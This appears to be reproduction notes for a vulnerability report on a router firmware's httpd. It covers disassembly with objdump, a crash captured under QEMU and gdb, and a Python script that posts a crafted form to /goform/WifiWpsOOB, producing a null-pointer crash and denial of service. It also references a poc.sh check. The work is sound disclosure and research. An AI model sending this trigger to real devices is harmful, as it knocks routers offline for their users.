# Reproduction commands

The commands below produce everything in `evidence/`. They assume the firmware is unpacked
at `./squashfs-root` and `httpd` has been copied out as `./httpd`.

## Preparation

```
arm-linux-gnueabi-readelf -h httpd | head -5
arm-linux-gnueabi-readelf -sW httpd | grep -w formWifiWpsOOB
```

`formWifiWpsOOB` is at `0x9b674`, size 776.

## Disassembly

```
arm-linux-gnueabi-objdump -d --no-show-raw-insn \
    --start-address=0x9b674 --stop-address=0x9b97c httpd
```

Look for:

```
09b71c  ldr  r0, [fp, #-16]
09b720  bl   atoi@plt
09b74c  cmp  r3, #0
```

## Crash under the debugger

```
# guest, with the gdb stub
setsid qemu-arm -g 1234 -L ./ bin/httpd &

# debugger
cat > /tmp/cmds.txt <<'EOF'
set architecture arm
set pagination off
set confirm off
target remote 127.0.0.1:1234
continue
info registers r0 r1 r2 r3 r6 pc lr sp
x/8i $pc-16
p/x $r6
x/4xb $r6
x/400xw $sp
quit
EOF

gdb-multiarch -q -batch -x /tmp/cmds.txt > capture.txt
```

Trigger it from another shell:

```python
import socket

req = (b'POST /goform/WifiWpsOOB HTTP/1.1\r\nHost: 192.168.0.1\r\n'
       b'Cookie: password=x\r\nContent-Type: application/x-www-form-urlencoded\r\n'
       b'Content-Length: 5\r\n\r\nfoo=1\r\n')

s = socket.create_connection(('192.168.0.1', 80), timeout=10)
s.sendall(req)
try:
    print(s.recv(256))
except Exception as e:
    print('no response:', type(e).__name__)
```

Expected in `capture.txt`:

```
Program received signal SIGSEGV, Segmentation fault.
r0 = 0x0   r6 = 0x0   pc = 0x3fdedafc
=> 0x3fdedafc:  ldrb  r3, [r6]
$1 = 0x0
Cannot access memory at address 0x0
```

The 400-word stack dump contains `0x0009b724`, the return address of the `atoi` call.

## Two-case check

```
./poc.sh 192.168.0.1
```

Expected:

```
[2/4] baseline - 'index' present  -> HTTP = 200
[3/4] trigger  - 'index' absent   -> HTTP = 000
[4/4] confirming the service is gone -> HTTP = 000
```

## Screenshots

If images are wanted, capture the terminal output of the three sections above:

| File | Content |
| --- | --- |
| `01-disassembly.png` | the objdump region, with `atoi` and the later `cmp #0` marked |
| `02-gdb-crash.png` | the SIGSEGV block with registers and faulting instruction |
| `03-fault-address.png` | `$1 = 0x0` and `Cannot access memory at address 0x0` |
| `04-caller-on-stack.png` | the stack line containing `0x0009b724` |
| `05-trigger-ab.png` | the `poc.sh` output |
| `06-all-models.png` | the table in `evidence/06-per-model-verification.md` |

## Environment notes

- The emulated device listens on `192.168.0.1`; run the trigger from a namespace that can
  reach it (inside the emulation container is simplest).
- Builds that answer `302` on first contact need the server-issued cookie first. `poc.sh`
  handles this.
- The firmware is used unmodified.
